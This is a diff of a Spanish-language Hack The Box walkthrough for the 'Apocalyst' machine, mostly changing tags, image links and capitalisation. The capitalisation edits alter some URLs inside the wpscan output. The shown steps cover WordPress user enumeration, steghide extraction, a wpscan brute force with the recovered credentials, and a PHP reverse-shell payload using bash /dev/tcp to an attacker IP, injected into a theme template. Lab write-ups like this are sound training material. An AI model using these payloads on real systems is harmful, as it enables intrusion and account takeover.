@@ -6,37 +6,31 @@ categories:
   - HTB
   - Linux
 tags:
-  - SQLI
-  - (Read
-  - Files)
-  - SQLI
-  - (SQL
-  - Injection)
-  - Abusing
-  - Sudoers
-  - HTTP
-  - Header
-  - Command
-  - Injection
-  - "-"
-  - X-FORWARDED-FOR
-  - "[RCE]"
+  - Information Leakage
+  - Wordpress Exploitation
+  - Wordpress Enumeration
+  - Wordpress Bruteforce
+  - Abusing misconfigured permissions [Privilege Escalation]
+  - Image Stego Challenge - Steghide
 image:
-  path: /assets/img/Union/Union.png
+  path: /assets/img/Apocalyst/Apocalyst.png
 ---
 
 ## Skills
 
-- WordPress Exploitation - Theme Editor [RCE]
+- Wordpress Exploitation - Theme Editor [RCE]
 - Abusing misconfigured permissions [Privilege Escalation]
 - Wordpress Enumeration
+- Wordpress Bruteforce
 - Image Stego Challenge - Steghide
 - Information Leakage - User Enumeration
+  
 ## Certificaciones
 
 - eJPT
 - eWPT
 - OSCP (Escalada)
+  
 ## Descripción
 
 `Apocalyst` es una máquina `medium linux`, la `web` es un `Wordpress` así que obtenemos el usuario debido al `nombre` del `autor` de un artículo, nos montamos un `diccionario` con `cewl` y `fuzzeando rutas` con encontramos con una `imagen` con `contenido oculto`. El `contenido oculto` es una `lista` de `palabras`, usamos esta `lista` para `bruteforcear` el panel de `login` del `Wordpres` ganando así `acceso`, desde el `Wordpress` ganamos `acceso` a la máquina víctima `modificando` el archivo `404.php`. Una vez dentro vemos un `archivo` con la `contraseña` de un `usuario` lo que nos permite `cambiar` de `usuario`, posteriormente usamos `linpeas` para `analizar` el `sistema` y `sobrescribimos` el `/etc/passwd` convirtiéndonos así en usuario `root`
@@ -99,7 +93,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 |_http-title: Apocalypse Preparation Blog
 |_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-generator: WordPress 4.8
+|_http-generator: Wordpress 4.8
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -109,11 +103,11 @@ Nmap done: 1 IP address (1 host up) scanned in 17.78 seconds
 
 En la página `web` vemos lo siguiente
 
-![[image_1.png]]
+![](/assets/img/Apocalyst/image_1.png)
 
 Al `pinchar` sobre el `enlace` nos `redirige` al dominio `apocalyst.htb`
 
-![[image_2.png]]
+![](/assets/img/Apocalyst/image_2.png)
 
 `Añadimos` el `dominio` al `/etc/hosts`
 
@@ -130,15 +124,15 @@ ff02::2 ip6-allrouters
 
 Al acceder nuevamente al servicio `web` vemos esto
 
-![[image_3.png]]
+![](/assets/img/Apocalyst/image_3.png)
 
 Si `pinchamos` sobre un `artículo` podemos ver quién es su autor
 
-![[image_4.png]]
+![](/assets/img/Apocalyst/image_4.png)
 
 Este `usuario` es un usuario `válido`, lo podemos comprobar en `/wp-login.php`
 
-![[image_5.png]]
+![](/assets/img/Apocalyst/image_5.png)
 
 Como hay `mucho texto` en la web vamos a `crearnos` un `diccionario personalizado`
 
@@ -171,7 +165,7 @@ Requests/sec.: 100.6532
 
 Vemos esto al acceder a `/Rightiousness`, con las demás rutas también veíamos esta imagen, sin embargo, los `caracteres` son `diferentes`, lo que significa que hay `información oculta`
 
-![[image_6.png]]
+![](/assets/img/Apocalyst/image_6.png)
 
 `Vemos` el `contenido oculto` de la `imagen` debido a que no está protegida por ninguna contraseña
 
@@ -182,7 +176,7 @@ wrote extracted data to "list.txt".
 ```
 ## Web Exploitation
 
-Mediante `wpscan` hacemos `bruteforce` contra el `panel` de `login` del wordpress
+Mediante `wpscan` hacemos `bruteforce` contra el `panel` de `login` del Wordpress
 
 ```
 # wpscan --url http://apocalyst.htb -U falaraki -P list.txt 
@@ -194,7 +188,7 @@ _______________________________________________________________
             \  /\  /  | |     ____) | (__| (_| | | | |
              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
-         WordPress Security Scanner by the WPScan Team
+         Wordpress Security Scanner by the WPScan Team
                          Version 3.8.25
        Sponsored by Automattic - https://automattic.com/
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
@@ -214,13 +208,13 @@ Interesting Finding(s):
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
  | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+ |  - http://codex.Wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/Wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/Wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/Wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/Wordpress_pingback_access/
 
-[+] WordPress readme found: http://apocalyst.htb/readme.html
+[+] Wordpress readme found: http://apocalyst.htb/readme.html
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
 
@@ -232,25 +226,25 @@ Interesting Finding(s):
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 60%
  | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://www.iplocation.net/defend-Wordpress-from-ddos
  |  - https://github.com/wpscanteam/wpscan/issues/1299
 
-[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+[+] Wordpress version 4.8 identified (Insecure, released on 2017-06-08).
  | Found By: Rss Generator (Passive Detection)
- |  - http://apocalyst.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.8</generator>
- |  - http://apocalyst.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.8</generator>
+ |  - http://apocalyst.htb/?feed=rss2, <generator>https://Wordpress.org/?v=4.8</generator>
+ |  - http://apocalyst.htb/?feed=comments-rss2, <generator>https://Wordpress.org/?v=4.8</generator>
 
-[+] WordPress theme in use: twentyseventeen
+[+] Wordpress theme in use: twentyseventeen
  | Location: http://apocalyst.htb/wp-content/themes/twentyseventeen/
  | Last Updated: 2024-07-16T00:00:00.000Z
  | Readme: http://apocalyst.htb/wp-content/themes/twentyseventeen/README.txt
  | [!] The version is out of date, the latest version is 3.7
  | Style URL: http://apocalyst.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
  | Style Name: Twenty Seventeen
- | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Style URI: https://Wordpress.org/themes/twentyseventeen/
  | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
- | Author: the WordPress team
- | Author URI: https://wordpress.org/
+ | Author: the Wordpress team
+ | Author URI: https://Wordpress.org/
  |
  | Found By: Css Style In Homepage (Passive Detection)
  |
@@ -288,16 +282,16 @@ Trying falaraki / total Time: 00:01:02 <========================================
 
 Una vez `accedemos` al `Wordpress` con las credenciales `falaraki:Transclisiation` vemos lo siguiente
 
-![[image_7.png]]
+![](/assets/img/Apocalyst/image_7.png)
 ## Intrusión
 
 A continuación vamos a mandarnos una reverse shell a nuestro equipo, para ello pulsamos en `Appearance` y luego en `Editor`
 
-![[image_8.png]]
+![](/assets/img/Apocalyst/image_8.png)
 
 Pulsamos en el template `Error 404`
 
-![[image_9.png]]
+![](/assets/img/Apocalyst/image_9.png)
 
 Vamos a inyectar este paylod en el código php de la plantilla
 
@@ -305,7 +299,7 @@ Vamos a inyectar este paylod en el código php de la plantilla
 system("bash -c 'bash -i >& /dev/tcp/10.10.16.35/9993 0>&1'");
 ```
 
-![[image_10.png]]
+![](/assets/img/Apocalyst/image_10.png)
 
 Una vez hecho nos pulsamos en `Update File` en la parte inferior de la web y nos ponemos en escucha mediante netcat por el puerto 9993
 
